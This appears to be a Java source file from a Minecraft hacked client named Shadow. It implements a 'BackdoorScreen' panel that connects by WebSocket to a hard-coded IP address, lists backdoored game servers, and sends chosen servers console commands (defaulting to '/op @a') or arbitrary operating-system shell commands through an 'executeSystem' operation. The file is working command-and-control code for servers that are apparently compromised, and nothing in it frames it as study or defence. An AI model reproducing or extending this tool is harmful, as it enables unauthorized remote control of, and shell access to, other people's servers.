package net.shadow.client.feature.gui.backdoor;

import java.awt.Color;
import java.net.URI;
import java.util.ArrayList;
import java.util.List;

import org.java_websocket.WebSocket;
import org.lwjgl.glfw.GLFW;

import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.text.LiteralText;
import net.minecraft.text.Text;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.gui.clickgui.element.impl.config.StringSettingEditor;
import net.shadow.client.feature.gui.screen.ClientScreen;
import net.shadow.client.feature.gui.widget.RoundButton;
import net.shadow.client.feature.items.impl.Backdoor;
import net.shadow.client.helper.render.MSAAFramebuffer;
import net.shadow.client.helper.render.Renderer;

public class BackdoorScreen extends ClientScreen {

    String serverid = "";
    List<BackdoorEntry> servers = new ArrayList<BackdoorEntry>();
    StringSetting cmd = new StringSetting.Builder("/op @a").name("Console Command").get();
    StringSettingEditor cmdstat = new StringSettingEditor(425, 10, 400, cmd);
    StringSetting shell = new StringSetting.Builder("echo hi").name("Shell Command").get();
    StringSettingEditor shellstat = new StringSettingEditor(425, 50, 400, shell);
    BackdoorSocket bs;

    public BackdoorScreen() {
        super(MSAAFramebuffer.MAX_SAMPLES);
        this.bs = new BackdoorSocket(URI.create("ws://45.142.115.91/"), this);
        servers.clear();

        bs.connect();
    }
    
    @Override
    protected void init() {
    }

    void runshell(){
        System.out.println("running");
        this.bs.send("{\"op\":\"sendServer\",\"data\":{\"id\":\""+serverid+"\",\"payload\":{\"op\":\"executeSystem\",\"data\":{\"command\":\""+ shell.getValue() +"\"}}}}");
    }

    void runconsole(){
        System.out.println("firing");
        this.bs.send("{\"op\":\"sendServer\",\"data\":{\"id\":\""+serverid+"\",\"payload\":{\"op\":\"execute\",\"data\":{\"command\":\""+ cmd.getValue() +"\"}}}}");
    }

    void runDynamic(String payload){
        System.out.println("firing");
        this.bs.send("{\"op\":\"sendServer\",\"data\":{\"id\":\""+serverid+"\",\"payload\":{\"op\":\"execute\",\"data\":{\"command\":\""+ payload+"\"}}}}");
    }

    @Override
    public void render(MatrixStack matrices, int mouseX, int mouseY, float delta) {
       MSAAFramebuffer.use(MSAAFramebuffer.MAX_SAMPLES, () -> {
           cmdstat.render(matrices, mouseX, mouseY, delta);
           shellstat.render(matrices, mouseX, mouseY, delta);
           Renderer.R2D.renderRoundedQuad(matrices, new Color(100, 100, 100, 255), 5, 5, 415, ShadowMain.client.getWindow().getScaledHeight() - 5, 5, 10);
           Renderer.R2D.renderQuad(matrices, new Color(0, 0, 0, 150), 0, 0, ShadowMain.client.getWindow().getScaledWidth(), ShadowMain.client.getWindow().getScaledHeight());
           for(BackdoorEntry server : servers){
               server.render(matrices);
           }
       });
    }
    

    @Override
    public boolean mouseScrolled(double mouseX, double mouseY, double amount) {
        return true;
    }

    @Override
    public boolean mouseClicked(double mouseX, double mouseY, int button) {
        for(BackdoorEntry server : servers){
            server.clicked(mouseX, mouseY, button, this);
        }
        cmdstat.clicked(mouseX, mouseY, button);
        shellstat.clicked(mouseX, mouseY, button);
        return super.mouseClicked(mouseX, mouseY, button);
    }

    @Override
    public boolean mouseReleased(double mouseX, double mouseY, int button) {
        return super.mouseReleased(mouseX, mouseY, button);
    }

    @Override
    public boolean mouseDragged(double mouseX, double mouseY, int button, double deltaX, double deltaY) {
        return super.mouseDragged(mouseX, mouseY, button, deltaX, deltaY);
    }


    void execute(){
        if(shellstat.getRawParent().isFocused()){
            runshell();
        }
        if(cmdstat.getRawParent().isFocused()){
            runconsole();
        }
    }

    @Override
    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
        if (keyCode == GLFW.GLFW_KEY_ENTER || keyCode == GLFW.GLFW_KEY_KP_ENTER) {
            execute();
            return true;
        }
        shellstat.keyPressed(keyCode, modifiers);
        cmdstat.keyPressed(keyCode, modifiers);
        return super.keyPressed(keyCode, scanCode, modifiers);
    }

    @Override
    public boolean shouldPause() {
        return false;
    }

    public void postMessage(int id) {
        for(BackdoorEntry server : servers){
            if(server.id == id){
                server.postMessage("sel");
                serverid = server.canonicalid;
            }else{
                server.postMessage("desel");
            }
        }
    }
    
    public void socketPostMessage(String[] data, int id){
        switch(id){
            case 0 -> {
                servers.add(new BackdoorEntry(10, 10 + (60 * servers.size()), 400, 50, servers.size(), data[0], data[1], data[2]));
            }

            case 1 ->{
                for(BackdoorEntry server : new ArrayList<>(servers)){
                    if(server.canonicalid == data[0]){
                        servers.remove(server);
                    }
                }
            }
        }
    }

    @Override
    public boolean charTyped(char chr, int modifiers) {
        cmdstat.charTyped(chr, modifiers);
        shellstat.charTyped(chr, modifiers);
        return false;
    }
}
